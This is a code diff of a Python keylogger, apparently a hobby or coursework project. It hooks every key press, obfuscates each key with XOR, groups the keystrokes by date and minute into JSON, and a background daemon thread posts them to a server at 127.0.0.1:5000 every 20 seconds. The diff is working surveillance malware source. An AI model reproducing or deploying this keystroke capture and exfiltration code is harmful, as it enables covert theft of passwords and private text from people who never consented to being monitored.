@@ -4,7 +4,7 @@ from Xor_2 import xor_on_key
 
 my_json = []
 url = f"http://127.0.0.1:5000/save_data"
-
+times = []
 
 def send_data_to_server():
     status = requests.post(url, json=my_json)
@@ -12,11 +12,12 @@ def send_data_to_server():
 
 def time_stoper(timeout, func):
     def wrapper():
-        global my_json
+        global my_json, times
         while True:
+            time.sleep(timeout)
             func()
             my_json = []
-            time.sleep(timeout)
+            times = []
     t = threading.Thread(target=wrapper, daemon=True)
     t.start()
 
@@ -38,36 +39,24 @@ def on_key_press(key):
     and inserts it into a dictionary entry whose key is the current date and time.
     """
 
-    key = replace_char(key.name)
+    key = xor_on_key(replace_char(key.name), 7)
 
+    current_time = datetime.now().strftime('%y/%m/%d %H:%M')
     year = datetime.now().strftime('%y')
     month = datetime.now().strftime('%m')
     day = datetime.now().strftime('%d')
-    minute = datetime.now().strftime('%H:%M')
+    hour = datetime.now().strftime('%H')
+    minute = datetime.now().strftime('%M')
 
-    if not my_json:
-        my_json.append({})
-
-    if year not in my_json[0]:
-        my_json[0][year] = {}
-    
-    if month not in my_json[0][year]:
-        my_json[0][year][month] = {}
-    
-    if day not in my_json[0][year][month]:
-        my_json[0][year][month][day] = {}
-    
-    if minute not in my_json[0][year][month][day]:
-        my_json[0][year][month][day][minute] = ''
-
-
-    my_json[0][year][month][day][minute] += xor_on_key(key, 7)
+    if current_time not in times:
+        times.append(current_time)
+        my_json.append({"date": f"{month}/{day}/{year}", "time": f"{hour}:{minute}", "text": key})
+    else:
+        my_json[-1]["text"] += key
 
 
 #For checking the current file.
 if __name__ == "__main__":
-    my_file = open(filename, "w")
-    my_file.write("")
     keyboard.on_press(on_key_press)               #function call.
     print("program start")
     time_stoper(20, send_data_to_server)
